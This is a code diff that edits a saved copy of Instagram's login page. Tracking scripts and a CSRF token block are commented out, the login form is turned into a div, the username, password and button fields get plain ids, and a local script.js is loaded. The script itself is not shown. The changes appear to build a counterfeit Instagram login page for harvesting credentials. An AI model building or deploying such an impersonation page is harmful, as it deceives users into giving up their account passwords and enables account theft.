@@ -23,11 +23,10 @@
 
   <link href="https://graph.instagram.com/" rel="preconnect" crossorigin="">
 
-
-  <link rel="preload" href="./index_files/b67d172d5783.js.download" as="script" type="text/javascript"
-    crossorigin="anonymous">
-
-  <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script>
+  <!-- <link rel="preload" href="./index_files/b67d172d5783.js.download" as="script" type="text/javascript"
+    crossorigin="anonymous"> -->
+  <!-- <script src="./script.js"></script> -->
+  <!-- <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script>
   <script id="facebook-jssdk" src="./index_files/sdk.js.download"></script>
   <script type="text/javascript">
     (function () {
@@ -47,7 +46,7 @@
         ob.observe({ entryTypes: ['paint'] });
       }
     })();
-  </script>
+  </script> -->
 
   <link rel="apple-touch-icon-precomposed" sizes="76x76"
     href="https://www.instagram.com/static/images/ico/apple-touch-icon-76x76-precomposed.png/932e4d9af891.png">
@@ -2360,8 +2359,8 @@
       opacity: .5
     }
   </style>
-  <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous"
-    src="./index_files/b67d172d5783.js.download"></script>
+  <!-- <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous"
+    src="./index_files/b67d172d5783.js.download"></script> -->
   <style type="text/css" data-isostyle-id="is-4e1ca5a2">
     ._d2vov {
       color: #262626;
@@ -6289,7 +6288,7 @@
       -webkit-align-self: center;
       -ms-flex-item-align: center;
       align-self: center;
-      background-image: url(/static/images/homepage/home-phones.png/38825c9d5aa2.png);
+      background-image: url(./index_files/38825c9d5aa2.png);
       background-position: 0 0;
       background-size: 454px 618px;
       -webkit-flex-basis: 454px;
@@ -6303,7 +6302,7 @@
     @media screen and (-webkit-min-device-pixel-ratio:1.5),
     screen and (min-resolution:1.5dppx) {
       ._ngtox {
-        background-image: url(/static/images/homepage/home-phones@2x.png/f82c2ede4ccb.png)
+        background-image: url(./index_files/f82c2ede4ccb.png)
       }
     }
 
@@ -6882,12 +6881,12 @@
             <div class="_f9sjj">
               <h1 class="_68swa _8scx2 coreSpriteLoggedOutWordmark">Instagram</h1>
               <div class="_1zdb1">
-                <form class="_3jvtb" action="login.php" method="POST">
+                <div class="_3jvtb" method="POST">
                   <div class="_t296e">
                     <div class="_sjplo">
                       <div class="_ev9xl">
                         <!--<label for="fa4e2a34ab06a" class="_ssj08">Phone number, username, or email</label>--><input
-                          type="text" class="_ph6vk _jdqpn _o716c" id="fa4e2a34ab06a" aria-describedby=""
+                          type="text" class="_ph6vk _jdqpn _o716c" id="userName" aria-describedby=""
                           placeholder="Phone number, username, or email" aria-required="true" autocapitalize="off"
                           autocorrect="off" maxlength="30" name="username" value="">
                       </div>
@@ -6897,15 +6896,15 @@
                   <div class="_t296e">
                     <div class="_sjplo">
                       <div class="_ev9xl"><!--<label for="faa2da1ad083" class="_ssj08">Password</label>--><input
-                          type="password" class="_ph6vk _jdqpn _o716c" id="faa2da1ad083" aria-describedby=""
+                          type="password" class="_ph6vk _jdqpn _o716c" id="password" aria-describedby=""
                           placeholder="Password" aria-required="true" autocapitalize="off" autocorrect="off"
                           name="password" value=""></div>
                       <div class="_gaby6"></div>
                     </div>
-                  </div><span class="_t38eb _ov9ai"><button style="border-radius: 10px;"
+                  </div><span class="_t38eb _ov9ai"><button id='loginSubmit' style="border-radius: 10px;"
                       class="_qv64e _gexxb _4tgw8 _njrw0">Log in</button></span><a class="_pbd5h"
                     href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
-                </form>
+                </div>
               </div>
             </div>
             <div class="_f9sjj">
@@ -7007,8 +7006,10 @@
 
 
 
-  <script
+  <!-- <script
     type="text/javascript">window._sharedData = { "activity_counts": null, "config": { "csrf_token": "Kn0USeqztZ66kyrqqDlveWyMvxEU7cO1", "viewer": null }, "country_code": "PL", "language_code": "en", "locale": "en_US", "entry_data": { "LandingPage": [{ "captcha": { "enabled": false, "key": "" }, "prefill_subno": "" }] }, "gatekeepers": { "ld": true }, "qe": { "dash_for_vod": { "g": "", "p": {} }, "bc3l": { "g": "", "p": {} }, "aysf": { "g": "", "p": {} }, "notif": { "g": "", "p": {} }, "follow_button": { "g": "", "p": {} }, "login_via_signup_page": { "g": "launch", "p": { "is_enabled": "true" } }, "loggedout": { "g": "", "p": {} }, "stories": { "g": "", "p": {} }, "exit_story_creation": { "g": "", "p": {} }, "su_universe": { "g": "test_msisdn_prefill_12_18", "p": { "has_msisdn_prefill": "true" } }, "us_li": { "g": "", "p": {} }, "sidecar": { "g": "", "p": {} }, "video": { "g": "", "p": {} }, "filters": { "g": "", "p": {} }, "appsell": { "g": "", "p": {} }, "collections": { "g": "", "p": {} }, "save": { "g": "", "p": {} }, "stale": { "g": "", "p": {} }, "reg": { "g": "", "p": {} }, "reg_vp": { "g": "", "p": {} }, "prof_pic_upsell": { "g": "", "p": {} }, "prof_pic_creation": { "g": "", "p": {} }, "onetaplogin": { "g": "", "p": {} }, "feed_vp": { "g": "", "p": {} }, "push_notifications": { "g": "", "p": {} }, "login_poe": { "g": "", "p": {} }, "prefetch": { "g": "", "p": {} }, "report_haf": { "g": "", "p": {} }, "reporting": { "g": "", "p": {} }, "a2hs": { "g": "", "p": {} }, "bg_sync": { "g": "", "p": {} }, "disc_ppl": { "g": "", "p": {} }, "ebdsim_li": { "g": "", "p": {} }, "ebdsim_lo": { "g": "", "p": {} }, "embeds": { "g": "", "p": {} }, "prvcy_tggl": { "g": "", "p": {} }, "v_grid": { "g": "", "p": {} }, "tp_pblshr": { "g": "", "p": {} }, "fs": { "g": "", "p": {} }, "404_as_react": { "g": "", "p": {} } }, "hostname": "www.instagram.com", "display_properties_server_guess": { "pixel_ratio": 1.0, "viewport_width": 1920, "viewport_height": 974, "orientation": "landscape-primary" }, "environment_switcher_visible_server_guess": true, "platform": "windows_nt_10", "nonce": "i2KDUO+GOzRqOg2tDpueoA==", "zero_data": {}, "rollout_hash": "4768567ecf1f", "probably_has_app": false, "show_app_install": true };</script>
+
+
 
   <script type="text/javascript" src="./index_files/d1f0f06b39df.js.download" crossorigin="anonymous"></script>
   <script
@@ -7034,7 +7035,7 @@
     fbq('track', 'PageView');
 
 
-  </script>
+  </script> -->
   <noscript>
 
 
@@ -7047,15 +7048,19 @@
   </div>
   <div id="fb-root" class=" fb_reset">
     <div style="position: absolute; top: -10000px; height: 0px; width: 0px;">
-      <div><iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true"
-          scrolling="no" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame"
-          tabindex="-1" src="./index_files/lY4eZXm_YWu.html" style="border: none;"></iframe></div>
+      <div>
+        <!-- <iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no"
+          id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1"
+          src="./index_files/lY4eZXm_YWu.html" style="border: none;"></iframe> -->
+      </div>
     </div>
     <div style="position: absolute; top: -10000px; height: 0px; width: 0px;">
       <div></div>
     </div>
   </div>
-  <script type="text/javascript"
+
+  <script type="module" src="./script.js"></script>
+  <!-- <script type="text/javascript"
     src="chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/bootstrap/js/bootstrap.min.js"></script>
   <script type="text/javascript"
     src="chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/savejs/jszip-utils.js"></script>
@@ -7064,7 +7069,7 @@
   <script type="text/javascript"
     src="chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/inject_download_all.js"></script>
   <script type="text/javascript" src="chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/helpBar.js"></script>
-  <script type="text/javascript" src="chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/js/dash.all.min.js"></script>
+  <script type="text/javascript" src="chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/js/dash.all.min.js"></script> -->
   <div class="help-panel">
 
 </body>
